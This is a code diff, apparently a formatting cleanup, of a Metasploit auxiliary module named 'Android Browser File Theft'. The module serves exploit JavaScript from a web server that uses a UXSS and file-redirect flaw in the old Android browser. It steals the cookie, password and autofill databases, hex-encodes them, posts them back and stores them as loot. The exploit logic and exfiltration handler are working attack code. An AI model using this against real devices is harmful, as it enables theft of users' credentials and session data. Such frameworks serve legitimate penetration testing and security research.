@@ -3,36 +3,42 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpServer::HTML
   include Msf::Auxiliary::Report
   include Msf::Exploit::JSObfu
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'        => 'Android Browser File Theft',
-      'Description' => %q{
-        This module steals the cookie, password, and autofill databases from the
-        Browser application on AOSP 4.3 and below.
-      },
-      'Author'         => [
-        'Rafay Baloch', # Found UXSS bug in Android Browser
-        'joev'          # File redirect and msf module
-      ],
-      'License'     => MSF_LICENSE,
-      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
-      'PassiveActions' => [ 'WebServer' ],
-      'References' =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Android Browser File Theft',
+        'Description' => %q{
+          This module steals the cookie, password, and autofill databases from the
+          Browser application on AOSP 4.3 and below.
+        },
+        'Author' => [
+          'Rafay Baloch', # Found UXSS bug in Android Browser
+          'joev'          # File redirect and msf module
+        ],
+        'License' => MSF_LICENSE,
+        'Actions' => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
+        'PassiveActions' => [ 'WebServer' ],
+        'References' => [
           # patch for file redirection, 2014
           ['URL', 'https://android.googlesource.com/platform/packages/apps/Browser/+/d2391b492dec778452238bc6d9d549d56d41c107%5E%21/#F0'],
           ['URL', 'https://bugs.chromium.org/p/chromium/issues/detail?id=90222'] # the UXSS
         ],
-      'DefaultAction'  => 'WebServer'
-    ))
+        'DefaultAction' => 'WebServer',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
-     register_options([
+    register_options([
       OptString.new('ADDITIONAL_FILES', [
         false,
         'Comma-separated list of addition file URLs to steal.',
@@ -63,7 +69,7 @@ class MetasploitModule < Msf::Auxiliary
     data = JSON.parse(request.body)
     contents = hex2bin(data['data'])
     file = File.basename(data['url'])
-    print_good("File received: #{(contents.bytesize.to_f/1000).round(2)}kb #{file}")
+    print_good("File received: #{(contents.bytesize.to_f / 1000).round(2)}kb #{file}")
     loot_path = store_loot(
       file,
       'application/x-sqlite3',
@@ -74,7 +80,6 @@ class MetasploitModule < Msf::Auxiliary
     )
     print_good("Saved to: #{loot_path}")
   end
-
 
   def file_urls
     default_urls = [
@@ -91,7 +96,7 @@ class MetasploitModule < Msf::Auxiliary
       default_urls = []
     end
 
-    default_urls + (datastore['ADDITIONAL_FILES']||'').split(',')
+    default_urls + (datastore['ADDITIONAL_FILES'] || '').split(',')
   end
 
   def exploit_html
@@ -140,7 +145,7 @@ class MetasploitModule < Msf::Auxiliary
                     return (c.length < 2) ? 0+c : c;
                   }).join(new String);
                   /*ensures there are no 'not allowed' responses that appear to be valid data*/
-                  if (hex.length && hex.indexOf('#{Rex::Text.to_hex("<html><body>not allowed</body></html>","")}') === -1) {
+                  if (hex.length && hex.indexOf('#{Rex::Text.to_hex("<html><body>not allowed</body></html>", "")}') === -1) {
                     top.postMessage({data:hex,url:location.href}, '*');
                   }
                   parent.postMessage(1,'*');
